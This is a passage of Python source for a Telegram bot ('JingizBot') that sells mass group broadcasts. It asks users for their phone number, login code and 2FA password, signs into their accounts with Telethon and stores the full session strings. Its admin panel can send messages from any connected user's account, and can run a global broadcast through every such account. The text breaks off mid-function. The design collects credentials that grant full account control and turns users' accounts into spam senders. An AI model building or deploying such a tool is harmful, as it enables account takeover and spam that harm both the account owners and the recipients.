import asyncio
import csv
import io
import html
import logging
from datetime import datetime, timezone
from contextlib import suppress

from aiohttp import web
from aiogram import Bot, Dispatcher, F
from aiogram.filters import CommandStart, Command
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.types import (
    Message, CallbackQuery, InlineKeyboardMarkup, InlineKeyboardButton,
    ReplyKeyboardMarkup, KeyboardButton, BufferedInputFile, BotCommand
)
from aiogram.exceptions import TelegramBadRequest, TelegramForbiddenError
from telethon import TelegramClient
from telethon.sessions import StringSession
from telethon.errors import SessionPasswordNeededError, PhoneCodeInvalidError, PhoneNumberInvalidError, PhoneCodeExpiredError, PasswordHashInvalidError

import db
import sender
from config import config

logging.basicConfig(level=logging.INFO, format="%(asctime)s %(levelname)s %(name)s: %(message)s")
log = logging.getLogger("jingizbot")

bot = Bot(config.bot_token)
dp = Dispatcher()
campaign_tasks: dict[int, asyncio.Task] = {}
timer_tasks: dict[int, asyncio.Task] = {}
login_clients: dict[int, TelegramClient] = {}

class LoginFlow(StatesGroup):
    phone = State()
    code = State()
    password = State()

class TextFlow(StatesGroup):
    broadcast_text = State()
    timer_text = State()
    timer_datetime = State()

class AdminFlow(StatesGroup):
    add_user = State()
    add_admin = State()
    give_stars = State()
    price_value = State()
    force_sub = State()
    admin_user_broadcast_id = State()
    admin_user_broadcast_text = State()
    global_broadcast_text = State()
    refresh_user = State()
    remove_admin = State()

MAIN_KB = ReplyKeyboardMarkup(keyboard=[
    [KeyboardButton(text="🔗 Подключить аккаунт"), KeyboardButton(text="👥 Группы")],
    [KeyboardButton(text="📨 Рассылка"), KeyboardButton(text="⏱ Рассылка по таймеру")],
    [KeyboardButton(text="⏳ Интервал"), KeyboardButton(text="✍️ Подпись")],
    [KeyboardButton(text="⭐ Мои звёзды"), KeyboardButton(text="🔄 Обновить группы")],
    [KeyboardButton(text="🛑 Остановить рассылку"), KeyboardButton(text="📋 Мои задачи")],
    [KeyboardButton(text="☰ Меню")],
], resize_keyboard=True)

ADMIN_KB = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="➕ Добавить пользователя", callback_data="adm:add_user"),
     InlineKeyboardButton(text="➕ Добавить администратора", callback_data="adm:add_admin")],
    [InlineKeyboardButton(text="👑 Список администраторов", callback_data="adm:admins"),
     InlineKeyboardButton(text="⭐ Начислить звёзды", callback_data="adm:stars")],
    [InlineKeyboardButton(text="💰 Цены", callback_data="adm:prices"),
     InlineKeyboardButton(text="📢 Обязательная подписка", callback_data="adm:subs")],
    [InlineKeyboardButton(text="📨 От аккаунта пользователя", callback_data="adm:user_broadcast"),
     InlineKeyboardButton(text="🌐 Общая рассылка", callback_data="adm:global_broadcast")],
    [InlineKeyboardButton(text="👥 Пользователи", callback_data="adm:users"),
     InlineKeyboardButton(text="📤 Экспорт CSV", callback_data="adm:csv")],
    [InlineKeyboardButton(text="📊 Статистика", callback_data="adm:stats")],
    [InlineKeyboardButton(text="🔄 Данные пользователя", callback_data="adm:refresh_user"),
     InlineKeyboardButton(text="🗑 Удалить администратора", callback_data="adm:remove_admin")],
])

PRICE_KEYS = {
    "connect_price": "Подключение",
    "broadcast_price": "Рассылка",
    "unsign_price": "Отключение подписи",
    "timer_price": "Таймер",
    "groups_refresh_price": "Обновление групп",
    "fetch_groups_price": "Загрузка групп",
}

def is_super(user_id: int) -> bool:
    return user_id in config.super_admins

async def admin_check(user_id: int) -> bool:
    return await db.is_admin(user_id, config.super_admins)

async def charge_if_needed(user_id: int, price_key: str) -> bool:
    if await admin_check(user_id):
        return True
    price = await db.get_price(price_key)
    if price <= 0:
        return True
    return await db.spend_stars(user_id, price)

async def force_sub_check(user_id: int) -> tuple[bool, list[str]]:
    subs = await db.list_force_subs()
    missing = []
    for sub in subs:
        ref = sub["chat_ref"]
        try:
            member = await bot.get_chat_member(ref, user_id)
            if member.status not in ("creator", "administrator", "member"):
                missing.append(ref)
        except Exception:
            # Агар бот дар канал/гурӯҳ ҳуқуқи санҷиш надошта бошад, обуна тасдиқ намешавад.
            missing.append(ref)
    return not missing, missing

def force_sub_kb(refs: list[str]):
    rows = []
    for ref in refs:
        url = ref if ref.startswith("https://") else (f"https://t.me/{ref.lstrip('@')}" if not ref.startswith("-100") else "")
        if url:
            rows.append([InlineKeyboardButton(text=f"📢 Подписаться: {ref}", url=url)])
    rows.append([InlineKeyboardButton(text="✅ Проверить подписку", callback_data="check_subs")])
    return InlineKeyboardMarkup(inline_keyboard=rows)

async def show_home(message: Message):
    await message.answer("Здравствуйте! JingizBot готов к работе. Выберите действие в меню.", reply_markup=MAIN_KB)
    if await admin_check(message.from_user.id):
        await message.answer("👑 Панель администратора", reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="👑 Панель администратора", callback_data="adm:open")]
        ]))

@dp.message(CommandStart())
async def start(message: Message, state: FSMContext):
    await state.clear()
    user = message.from_user
    await db.upsert_user(user.id, user.username, user.full_name)
    allowed, missing = await force_sub_check(user.id)
    if not allowed:
        await message.answer("Для использования бота сначала подпишитесь на следующие каналы/группы:", reply_markup=force_sub_kb(missing))
        return
    await show_home(message)

@dp.callback_query(F.data == "check_subs")
async def check_subs(callback: CallbackQuery):
    allowed, missing = await force_sub_check(callback.from_user.id)
    if allowed:
        await callback.message.answer("Подписка подтверждена.")
        await show_home(callback.message)
    else:
        await callback.answer("Вы ещё не подписались на все каналы/группы.", show_alert=True)
    await callback.answer()

@dp.message(Command("menu"))
@dp.message(F.text == "☰ Меню")
async def menu_command(message: Message):
    await show_home(message)

@dp.message(Command("users"))
async def users_command(message: Message):
    if not await admin_check(message.from_user.id):
        await message.answer("Доступ запрещён.")
        return
    await show_users_page(message, 0)

@dp.message(Command("admin"))
async def admin_command(message: Message):
    if not await admin_check(message.from_user.id):
        await message.answer("Доступ запрещён.")
        return
    await message.answer("👑 Панель администратора", reply_markup=ADMIN_KB)

@dp.callback_query(F.data == "adm:open")
async def admin_open(callback: CallbackQuery):
    if not await admin_check(callback.from_user.id):
        await callback.answer("Доступ запрещён", show_alert=True)
        return
    await callback.message.answer("👑 Панель администратора", reply_markup=ADMIN_KB)
    await callback.answer()

async def require_user(message: Message):
    user = await db.get_user(message.from_user.id)
    if not user:
        await db.upsert_user(message.from_user.id, message.from_user.username, message.from_user.full_name)
        user = await db.get_user(message.from_user.id)
    return user

@dp.message(F.text == "🔗 Подключить аккаунт")
async def connect_start(message: Message, state: FSMContext):
    await require_user(message)
    if not await charge_if_needed(message.from_user.id, "connect_price"):
        await message.answer("Недостаточно звёзд.")
        return
    await state.set_state(LoginFlow.phone)
    await message.answer("Отправьте номер телефона Telegram. Код страны определяется автоматически по номеру: Россия +7, Таджикистан +992. Примеры: +79991234567 или +992900000000.\nНикому не сообщайте код входа и пароль двухэтапной аутентификации (2FA).")

@dp.message(LoginFlow.phone)
async def connect_phone(message: Message, state: FSMContext):
    raw_phone = (message.text or "").strip()
    digits = "".join(ch for ch in raw_phone if ch.isdigit())
    # Автоматически определяем код страны по введённому номеру: Таджикистан +992, Россия +7.
    if raw_phone.startswith("+"):
        phone = "+" + digits
    elif digits.startswith("992"):
        phone = "+" + digits
    elif digits.startswith("7"):
        phone = "+" + digits
    elif len(digits) == 9 and digits.startswith("9"):
        phone = "+992" + digits
    elif len(digits) == 10 and digits.startswith("9"):
        phone = "+7" + digits
    else:
        await message.answer("Не удалось определить страну. Введите номер с кодом +7 (Россия) или +992 (Таджикистан), например +79991234567 или +992900000000.")
        return
    if len(phone) < 8 or len(phone) > 20:
        await message.answer("Неверный номер. Пример: +992900000000 или +79991234567")
        return
    client = TelegramClient(StringSession(), config.api_id, config.api_hash)
    try:
        await client.connect()
        sent = await client.send_code_request(phone)
        login_clients[message.from_user.id] = client
        await state.update_data(phone=phone, phone_code_hash=sent.phone_code_hash)
        await state.set_state(LoginFlow.code)
        await message.answer("Введите код, полученный от Telegram, в формате 52.301 (точка будет удалена автоматически).")
    except PhoneNumberInvalidError:
        await client.disconnect()
        await message.answer("Неверный номер телефона. Попробуйте ещё раз.")
    except Exception as exc:
        await client.disconnect()
        log.exception("Failed to request login code")
        await message.answer(f"Не удалось отправить код: {type(exc).__name__}. Попробуйте позже.")

@dp.message(LoginFlow.code)
async def connect_code(message: Message, state: FSMContext):
    code_raw = (message.text or "").strip()
    # Пользователь может вводить код как 52.301; Telegram API получает только цифры.
    code = "".join(ch for ch in code_raw if ch.isdigit())
    data = await state.get_data()
    client = login_clients.get(message.from_user.id)
    if not client:
        await state.clear()
        await message.answer("Сессия входа потеряна. Начните подключение заново.")
        return
    try:
        await client.sign_in(phone=data["phone"], code=code, phone_code_hash=data["phone_code_hash"])
        await db.save_session(message.from_user.id, client.session.save(), data["phone"])
        await state.clear()
        login_clients.pop(message.from_user.id, None)
        await client.disconnect()
        await message.answer("✅ Аккаунт успешно подключён.")
    except SessionPasswordNeededError:
        await state.set_state(LoginFlow.password)
        await message.answer("Включена двухэтапная аутентификация Telegram (2FA). Введите пароль 2FA. Пароль не сохраняется в базе данных.")
    except (PhoneCodeInvalidError, PhoneCodeExpiredError):
        await message.answer("Неверный или просроченный код. Запросите новый код и введите его в формате 52.301.")
    except Exception as exc:
        log.exception("Login code failed")
        await message.answer(f"Не удалось войти: {type(exc).__name__}.")
        await cleanup_login(message.from_user.id, state)

@dp.message(LoginFlow.password)
async def connect_password(message: Message, state: FSMContext):
    client = login_clients.get(message.from_user.id)
    data = await state.get_data()
    if not client:
        await state.clear()
        await message.answer("Сессия входа потеряна. Начните подключение заново.")
        return
    password = (message.text or "").strip()
    try:
        await client.sign_in(password=password)
        await db.save_session(message.from_user.id, client.session.save(), data["phone"])
        await state.clear()
        login_clients.pop(message.from_user.id, None)
        await client.disconnect()
        await message.answer("✅ Аккаунт успешно подключён.")
    except PasswordHashInvalidError:
        await message.answer("Неверный пароль 2FA. Проверьте пароль и попробуйте ещё раз.")
    except Exception as exc:
        log.exception("2FA login failed")
        await message.answer(f"Не удалось завершить вход через 2FA: {type(exc).__name__}. Проверьте пароль и попробуйте ещё раз.")

async def cleanup_login(user_id: int, state: FSMContext):
    client = login_clients.pop(user_id, None)
    if client:
        with suppress(Exception):
            await client.disconnect()
    await state.clear()

def groups_keyboard(groups):
    rows = []
    for group in groups:
        mark = "✅" if group["is_selected"] else "⬜️"
        status = "" if group["can_send"] else " · нет прав на отправку"
        title = (group["title"] or str(group["chat_id"]))[:38]
        rows.append([InlineKeyboardButton(text=f"{mark} {title}{status}", callback_data=f"grp:{group['chat_id']}")])
    rows.append([InlineKeyboardButton(text="💾 Сохранить выбор", callback_data="grp:save")])
    return InlineKeyboardMarkup(inline_keyboard=rows)

@dp.message(F.text == "👥 Группы")
async def groups_menu(message: Message):
    await require_user(message)
    groups = await db.list_groups(message.from_user.id)
    if not groups:
        await message.answer("Список групп пуст. Нажмите «🔄 Обновить группы».")
        return
    await message.answer("Выберите несколько групп. Нажатия отмечают/снимают выбор; остальные кнопки останутся на месте. После выбора нажмите «Сохранить выбор».", reply_markup=groups_keyboard(groups))

@dp.callback_query(F.data.startswith("grp:"))
async def group_toggle(callback: CallbackQuery):
    if callback.data == "grp:save":
        groups = await db.list_groups(callback.from_user.id)
        chosen = sum(1 for g in groups if g["is_selected"] and g["can_send"])
        await callback.answer(f"Выбор сохранён: {chosen} групп(ы)", show_alert=True)
        await callback.message.edit_text(f"✅ Выбор сохранён. Выбрано групп с правом отправки: {chosen}.", reply_markup=groups_keyboard(groups))
        return
    try:
        chat_id = int(callback.data.split(":", 1)[1])
    except ValueError:
        await callback.answer("Некорректная группа", show_alert=True)
        return
    row = await db.toggle_group(callback.from_user.id, chat_id)
    if not row:
        await callback.answer("Группа не найдена", show_alert=True)
        return
    groups = await db.list_groups(callback.from_user.id)
    await callback.message.edit_reply_markup(reply_markup=groups_keyboard(groups))
    await callback.answer("Группа выбрана" if row["is_selected"] else "Выбор группы снят")

@dp.message(F.text == "🔄 Обновить группы")
async def refresh_groups(message: Message):
    user_id = message.from_user.id
    user = await require_user(message)
    if not await charge_if_needed(user_id, "groups_refresh_price"):
        await message.answer("Недостаточно звёзд.")
        return
    if not user["session_string"]:
        await message.answer("Сначала подключите аккаунт.")
        return
    await message.answer("Загружаю группы…")
    try:
        groups = await sender.fetch_user_groups(user["session_string"])
        await db.upsert_groups(user_id, groups)
        await message.answer(f"✅ Группы обновлены. Количество: {len(groups)}")
    except Exception as exc:
        log.exception("Group refresh failed")
        await message.answer(f"Не удалось загрузить группы: {type(exc).__name__}: {exc}")

@dp.message(F.text == "📨 Рассылка")
async def broadcast_start(message: Message, state: FSMContext):
    if not await charge_if_needed(message.from_user.id, "broadcast_price"):
        await message.answer("Недостаточно звёзд.")
        return
    user = await require_user(message)
    if not user["session_string"]:
        await message.answer("Сначала подключите аккаунт.")
        return
    groups = await db.selected_groups(message.from_user.id)
    if not groups:
        await message.answer("Сначала выберите группы.")
        return
    await state.set_state(TextFlow.broadcast_text)
    await message.answer(f"Отправьте текст сообщения. Оно будет отправлено в {len(groups)} выбранных групп. Интервал: {user['delay_seconds']} сек.")

@dp.message(TextFlow.broadcast_text)
async def broadcast_text(message: Message, state: FSMContext):
    text = (message.text or "").strip()
    if not text:
        await message.answer("Сообщение пустое. Отправьте текст.")
        return
    user_id = message.from_user.id
    await state.clear()
    old = campaign_tasks.get(user_id)
    if old and not old.done():
        await message.answer("Рассылка уже выполняется. Сначала остановите её.")
        return
    task = asyncio.create_task(run_campaign(user_id, text, message.chat.id))
    campaign_tasks[user_id] = task
    await message.answer("Рассылка запущена. Если Telegram применит ограничение, рассылка остановится.")

async def run_campaign(user_id: int, text: str, chat_id: int):
    try:
        result = await sender.send_campaign(user_id, text)
        msg = f"Рассылка завершена.\nОтправлено: {result['sent']}\nОшибок: {result['failed']}"
        if result["stopped"]:
            msg += "\n⚠️ Telegram применил ограничение или медленный режим. Рассылка остановлена."
        if result.get("errors"):
            msg += "\n\nПодробности:\n" + "\n".join(f"• {e}" for e in result["errors"][:5])
        await bot.send_message(chat_id, msg)
    except Exception as exc:
        log.exception("Campaign failed")
        await bot.send_message(chat_id, f"Не удалось выполнить рассылку: {type(exc).__name__}: {exc}")
    finally:
        campaign_tasks.pop(user_id, None)

@dp.message(F.text == "🛑 Остановить рассылку")
async def stop_campaign(message: Message):
    task = campaign_tasks.get(message.from_user.id)
    if task and not task.done():
        task.cancel()
        await message.answer("Запрос на остановку отправлен.")
    else:
        await message.answer("Активной рассылки нет.")
    timer = timer_tasks.get(message.from_user.id)
    if timer and not timer.done():
        timer.cancel()
        await message.answer("Таймер также остановлен.")

@dp.message(F.text == "⏳ Интервал")
async def delay_menu(message: Message):
    user = await require_user(message)
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="2 мин", callback_data="delay:120"),
         InlineKeyboardButton(text="3 мин", callback_data="delay:180"),
         InlineKeyboardButton(text="5 мин", callback_data="delay:300")],
        [InlineKeyboardButton(text="10 мин", callback_data="delay:600"),
         InlineKeyboardButton(text="15 мин", callback_data="delay:900"),
         InlineKeyboardButton(text="20 мин", callback_data="delay:1200")],
    ])
    await message.answer(f"Текущий интервал: {user['delay_seconds']//60} мин.\n⚠️ Слишком маленький интервал может привести к ограничениям аккаунта.", reply_markup=kb)

@dp.callback_query(F.data.startswith("delay:"))
async def set_delay_callback(callback: CallbackQuery):
    delay = int(callback.data.split(":")[1])
    if delay < config.min_delay or delay > config.max_delay:
        await callback.answer("Интервал вне допустимого диапазона.", show_alert=True)
        return
    await db.set_delay(callback.from_user.id, delay)
    await callback.answer(f"Интервал: {delay//60} мин")
    await callback.message.edit_reply_markup(reply_markup=None)

@dp.message(F.text == "✍️ Подпись")
async def signature_menu(message: Message):
    user = await require_user(message)
    enabled = user["signature_enabled"]
    if enabled:
        kb = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="⭐ Отключить подпись", callback_data="signature:off")]])
        await message.answer("Подпись включена:\nотправлено через @jingizbot", reply_markup=kb)
    else:
        kb = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="✅ Включить подпись", callback_data="signature:on")]])
        await message.answer("Подпись выключена.", reply_markup=kb)

@dp.callback_query(F.data.startswith("signature:"))
async def signature_toggle(callback: CallbackQuery):
    enabled = callback.data.endswith("on")
    if not enabled and not await charge_if_needed(callback.from_user.id, "unsign_price"):
        await callback.answer("Недостаточно звёзд.", show_alert=True)
        return
    await db.set_signature(callback.from_user.id, enabled)
    await callback.answer("Подпись включена" if enabled else "Подпись отключена")
    await callback.message.edit_reply_markup(reply_markup=None)

@dp.message(F.text == "⭐ Мои звёзды")
async def my_stars(message: Message):
    user = await require_user(message)
    await message.answer(f"⭐ Ваш баланс: {user['stars']} звёзд")

@dp.message(F.text == "⏱ Рассылка по таймеру")
async def timer_start(message: Message, state: FSMContext):
    if not await charge_if_needed(message.from_user.id, "timer_price"):
        await message.answer("Недостаточно звёзд.")
        return
    user = await require_user(message)
    if not user["session_string"]:
        await message.answer("Сначала подключите аккаунт.")
        return
    if not await db.selected_groups(message.from_user.id):
        await message.answer("Сначала выберите группы.")
        return
    await state.set_state(TextFlow.timer_text)
    await message.answer("Отправьте текст рассылки.")

@dp.message(TextFlow.timer_text)
async def timer_text(message: Message, state: FSMContext):
    await state.update_data(timer_text=(message.text or "").strip())
    await state.set_state(TextFlow.timer_datetime)
    await message.answer("Укажите время запуска в формате YYYY-MM-DD HH:MM (UTC), например 2026-12-31 18:30.")

@dp.message(TextFlow.timer_datetime)
async def timer_datetime(message: Message, state: FSMContext):
    try:
        run_at = datetime.strptime((message.text or "").strip(), "%Y-%m-%d %H:%M").replace(tzinfo=timezone.utc)
    except ValueError:
        await message.answer("Неверный формат. Пример: 2026-12-31 18:30")
        return
    if run_at <= datetime.now(timezone.utc):
        await message.answer("Время должно быть в будущем.")
        return
    data = await state.get_data()
    text = data.get("timer_text", "")
    await state.clear()
    task_id = await db.create_task(message.from_user.id, "timer", text, run_at)
    previous = timer_tasks.get(message.from_user.id)
    if previous and not previous.done():
        previous.cancel()
    timer_tasks[message.from_user.id] = asyncio.create_task(run_timer(message.from_user.id, task_id, text, run_at, message.chat.id))
    await message.answer(f"⏱ Таймер №{task_id} сохранён. Запуск: {run_at.strftime('%Y-%m-%d %H:%M UTC')}")

async def run_timer(user_id: int, task_id: int, text: str, run_at: datetime, chat_id: int):
    try:
        delay = max(0, (run_at - datetime.now(timezone.utc)).total_seconds())
        await asyncio.sleep(delay)
        await db.update_task(task_id, "running")
        result = await sender.send_campaign(user_id, text)
        status = "completed" if not result["stopped"] else "stopped"
        await db.update_task(task_id, status, result)
        report = f"Таймер №{task_id} завершён.\nОтправлено: {result['sent']}; ошибок: {result['failed']}."
        if result.get("errors"):
            report += "\n\nПодробности:\n" + "\n".join(f"• {e}" for e in result["errors"][:5])
        await bot.send_message(chat_id, report)
    except asyncio.CancelledError:
        await db.update_task(task_id, "cancelled")
        raise
    except Exception as exc:
        log.exception("Timer failed")
        await db.update_task(task_id, "failed", {"error": str(exc)})
        await bot.send_message(chat_id, f"Таймер #{task_id} завершился с ошибкой: {type(exc).__name__}.")
    finally:
        timer_tasks.pop(user_id, None)

@dp.message(F.text == "📋 Мои задачи")
async def my_tasks(message: Message):
    tasks = await db.list_tasks(message.from_user.id)
    if not tasks:
        await message.answer("Задач пока нет.")
        return
    type_names = {"timer": "Таймер", "broadcast": "Рассылка"}
    status_names = {"pending": "Ожидает", "running": "Выполняется", "completed": "Завершена", "stopped": "Остановлена", "cancelled": "Отменена", "failed": "Ошибка"}
    lines = [f"№{t['id']} · {type_names.get(t['task_type'], t['task_type'])} · {status_names.get(t['status'], t['status'])} · {t['created_at'].strftime('%Y-%m-%d %H:%M')}" for t in tasks[:30]]
    await message.answer("\n".join(lines))

# Панель администратора: все действия администратора бесплатны; цены применяются только к обычным пользователям.
async def show_users_page(message: Message, page: int):
    users = await db.list_users()
    page_size = 10
    pages = max(1, (len(users) + page_size - 1) // page_size)
    page = max(0, min(page, pages - 1))
    chunk = users[page * page_size:(page + 1) * page_size]
    if not chunk:
        await message.answer("Список пользователей пуст.")
        return
    lines = [f"👥 <b>Пользователи</b> · всего: {len(users)} · страница {page + 1}/{pages}", ""]
    for u in chunk:
        username = f"@{u['username']}" if u["username"] else "без username"
        connected = "🟢 подключён" if u["connected"] else "⚪ не подключён"
        safe_name = html.escape(str(u['full_name'] or 'Без имени'))
        safe_username = html.escape(username)
        lines.append(f"• <b>{safe_name}</b>\n  ID: <code>{u['user_id']}</code> · {safe_username}\n  ⭐ {u['stars']} · {connected}")
    rows = []
    nav = []
    if page > 0:
        nav.append(InlineKeyboardButton(text="⬅️ Назад", callback_data=f"users:{page-1}"))
    if page + 1 < pages:
        nav.append(InlineKeyboardButton(text="Вперёд ➡️", callback_data=f"users:{page+1}"))
    if nav:
        rows.append(nav)
    rows.append([InlineKeyboardButton(text="🔄 Обновить", callback_data=f"users:{page}")])
    await message.answer("\n".join(lines), parse_mode="HTML", reply_markup=InlineKeyboardMarkup(inline_keyboard=rows))

@dp.callback_query(F.data.startswith("users:"))
async def users_page_callback(callback: CallbackQuery):
    if not await admin_check(callback.from_user.id):
        await callback.answer("Доступ запрещён", show_alert=True)
        return
    page = int(callback.data.split(":", 1)[1])
    await show_users_page(callback.message, page)
    await callback.answer()

@dp.callback_query(F.data.startswith("adm:"))
async def admin_actions(callback: CallbackQuery, state: FSMContext):
    if not await admin_check(callback.from_user.id):
        await callback.answer("Доступ запрещён.", show_alert=True)
        return
    action = callback.data.split(":", 1)[1]
    await callback.answer()
    if action == "add_user":
        await state.set_state(AdminFlow.add_user)
        await callback.message.answer("Отправьте Telegram ID пользователя.")
    elif action == "add_admin":
        await state.set_state(AdminFlow.add_admin)
        await callback.message.answer("Отправьте Telegram ID нового администратора.")
    elif action == "admins":
        rows, supers = await db.list_admins(config.super_admins)
        text = "👑 Суперадминистраторы:\n" + ("\n".join(map(str, supers)) or "—")
        text += "\n\nДополнительные администраторы:\n" + ("\n".join(str(r["user_id"]) for r in rows) or "—")
        await callback.message.answer(text)
    elif action == "stars":
        await state.set_state(AdminFlow.give_stars)
        await callback.message.answer("Отправьте ID пользователя и количество звёзд в одной строке: ID 100")
    elif action == "prices":
        prices = [f"{key} = {await db.get_price(key)} ⭐" for key in PRICE_KEYS]
        kb = InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text=f"{label}: {await db.get_price(key)} ⭐", callback_data=f"price:{key}")]
            for key, label in PRICE_KEYS.items()
        ])
        await callback.message.answer("Нажмите на цену, чтобы изменить её:\n" + "\n".join(prices), reply_markup=kb)
    elif action == "subs":
        subs = await db.list_force_subs()
        kb = InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text=f"❌ №{s['id']} {s['chat_ref']}", callback_data=f"subdel:{s['id']}")]
            for s in subs
        ] + [[InlineKeyboardButton(text="➕ Добавить", callback_data="subadd")]])
        await callback.message.answer("Обязательная подписка. Бот должен состоять в канале/группе и иметь право проверять участников.", reply_markup=kb)
    elif action == "user_broadcast":
        await state.set_state(AdminFlow.admin_user_broadcast_id)
        await callback.message.answer("Отправьте ID пользователя, от имени подключённого аккаунта которого нужно отправить сообщение.")
    elif action == "global_broadcast":
        await state.set_state(AdminFlow.global_broadcast_text)
        await callback.message.answer("Отправьте текст общей рассылки. Он будет отправлен в выбранные группы каждого подключённого аккаунта.")
    elif action == "csv":
        users = await db.list_users()
        buf = io.StringIO()
        writer = csv.writer(buf)
        writer.writerow(["user_id", "username", "full_name", "stars", "connected", "created_at"])
        for u in users:
            writer.writerow([u["user_id"], u["username"], u["full_name"], u["stars"], u["connected"], u["created_at"]])
        await callback.message.answer_document(BufferedInputFile(buf.getvalue().encode("utf-8-sig"), filename="jingizbot_users.csv"))
    elif action == "users":
        await show_users_page(callback.message, 0)
    elif action == "stats":
        s = await db.stats()
        await callback.message.answer(
            f"📊 Статистика\nПользователи: {s['users']}\nПодключённые аккаунты: {s['connected']}\nГруппы: {s['groups']}\nОжидающие задачи: {s['tasks_pending']}\nДополнительные администраторы: {s['admins']}"
        )
    elif action == "refresh_user":
        await state.set_state(AdminFlow.refresh_user)
        await callback.message.answer("Отправьте ID пользователя для просмотра его данных.")
    elif action == "remove_admin":
        await state.set_state(AdminFlow.remove_admin)
        await callback.message.answer("Отправьте ID администратора для удаления. Суперадминистратора нельзя удалить этим способом.")

@dp.callback_query(F.data.startswith("price:"))
async def price_select(callback: CallbackQuery, state: FSMContext):
    if not await admin_check(callback.from_user.id):
        await callback.answer("Доступ запрещён.", show_alert=True)
        return
    key = callback.data.split(":", 1)[1]
    if key not in PRICE_KEYS:
        await callback.answer("Цена не найдена.", show_alert=True)
        return
    await state.update_data(price_key=key)
    await state.set_state(AdminFlow.price_value)
    await callback.message.answer(f"Отправьте новую цену для «{PRICE_KEYS[key]}» в звёздах. 0 = бесплатно.")
    await callback.answer()

@dp.callback_query(F.data == "subadd")
async def subadd_callback(callback: CallbackQuery, state: FSMContext):
    if not await admin_check(callback.from_user.id):
        await callback.answer("Доступ запрещён.", show_alert=True)
        return
    await state.set_state(AdminFlow.force_sub)
    await callback.message.answer("Отправьте username или ID канала/группы (например, @mychannel). Для кнопки подписки лучше использовать публичный username или ссылку.")
    await callback.answer()

@dp.callback_query(F.data.startswith("subdel:"))
async def subdel_callback(callback: CallbackQuery):
    if not await admin_check(callback.from_user.id):
        await callback.answer("Доступ запрещён.", show_alert=True)
        return
    await db.delete_force_sub(int(callback.data.split(":")[1]))
    await callback.answer("Удалено")
    await callback.message.edit_reply_markup(reply_markup=None)

@dp.message(AdminFlow.add_user)
async def admin_add_user(message: Message, state: FSMContext):
    if not await admin_check(message.from_user.id):
        await state.clear(); return
    try:
        user_id = int((message.text or "").strip())
        await db.upsert_user(user_id, None, "")
        await db.log_admin_action(message.from_user.id, "add_user", user_id)
        await message.answer(f"Пользователь {user_id} добавлен.")
    except Exception as exc:
        await message.answer(f"Неверный ID или ошибка базы данных: {exc}")
    await state.clear()

@dp.message(AdminFlow.add_admin)
async def admin_add_admin(message: Message, state: FSMContext):
    if not await admin_check(message.from_user.id):
        await state.clear(); return
    try:
        user_id = int((message.text or "").strip())
        await db.add_admin(user_id, message.from_user.id)
        await db.log_admin_action(message.from_user.id, "add_admin", user_id)
        await message.answer(f"Пользователь {user_id} назначен администратором.")
    except Exception as exc:
        await message.answer(f"Неверный ID или ошибка базы данных: {exc}")
    await state.clear()

@dp.message(AdminFlow.give_stars)
async def admin_give_stars(message: Message, state: FSMContext):
    if not await admin_check(message.from_user.id):
        await state.clear(); return
    try:
        parts = (message.text or "").split()
        user_id, amount = int(parts[0]), int(parts[1])
        if amount <= 0:
            raise ValueError("Количество должно быть положительным.")
        balance = await db.add_stars(user_id, amount)
        await db.log_admin_action(message.from_user.id, "give_stars", user_id, {"amount": amount})
        await message.answer(f"Пользователю {user_id} {amount} звёзд начислено. Баланс: {balance}")
    except Exception as exc:
        await message.answer(f"Формат: ID 100. Ошибка: {exc}")
    await state.clear()

@dp.message(AdminFlow.price_value)
async def admin_price_value(message: Message, state: FSMContext):
    if not await admin_check(message.from_user.id):
        await state.clear(); return
    data = await state.get_data()
    try:
        amount = int((message.text or "").strip())
        if amount < 0:
            raise ValueError("Цена не может быть отрицательной.")
        await db.set_price(data["price_key"], amount)
        await message.answer(f"Цена обновлена: {PRICE_KEYS[data['price_key']]} = {amount} ⭐. Для администраторов все функции остаются бесплатными.")
    except Exception as exc:
        await message.answer(f"Цена должна быть числом от 0 и выше: {exc}")
    await state.clear()

@dp.message(AdminFlow.force_sub)
async def admin_force_sub(message: Message, state: FSMContext):
    if not await admin_check(message.from_user.id):
        await state.clear(); return
    ref = (message.text or "").strip()
    if not ref:
        await message.answer("Отправьте username или ID.")
        return
    label = ref
    try:
        await db.add_force_sub(ref, label)
        await message.answer(f"Обязательная подписка добавлена: {ref}")
    except Exception as exc:
        await message.answer(f"Не удалось добавить: {exc}")
    await state.clear()

@dp.message(AdminFlow.admin_user_broadcast_id)
async def admin_user_broadcast_id(message: Message, state: FSMContext):
    if not await admin_check(message.from_user.id):
        await state.clear(); return
    try:
        target = int((message.text or "").strip())
        user = await db.get_user(target)
        if not user or not user["session_string"]:
            await message.answer("Пользователь не найден в базе или его аккаунт не подключён.")
            await state.clear()
            return
        await state.update_data(target_id=target)
        await state.set_state(AdminFlow.admin_user_broadcast_text)
        await message.answer("Отправьте текст сообщения.")
    except ValueError:
        await message.answer("ID должен быть числом.")

@dp.message(AdminFlow.admin_user_broadcast_text)
async def admin_user_broadcast_text(message: Message, state: FSMContext):
    if not await admin_check(message.from_user.id):
        await state.clear(); return
    data = await state.get_data()
    try:
        result = await sender.send_to_account(data["target_id"], (message.text or "").strip())
        report = f"Готово. Отправлено: {result['sent']}; ошибок: {result['failed']}."
        if result.get("errors"):
            report += "\n\nПодробности:\n" + "\n".join(f"• {e}" for e in result["errors"][:5])
        await message.answer(report)
        await db.log_admin_action(message.from_user.id, "user_broadcast", data["target_id"], result)
    except Exception as exc:
        await message.answer(f"Не удалось выполнить рассылку: {type(exc).__name__}: {exc}")
    await state.clear()

@dp.message(AdminFlow.global_broadcast_text)
async def admin_global_broadcast_text(message: Message, state: FSMContext):
    if not await admin_check(message.from_user.id):
        await state.clear(); return
    await state.clear()
    await message.answer("Общая рассылка запущена; это может занять некоторое время.")
    results = await sender.broadcast_all((message.text or "").strip())
    await message.answer(f"Общая рассылка завершена. Обработано аккаунтов: {len(results)}.")

@dp.message(AdminFlow.refresh_user)
async def admin_refresh_user(message: Message, state: FSMContext):
    if not await admin_check(message.from_user.id):
        await state.clear(); return
    try:
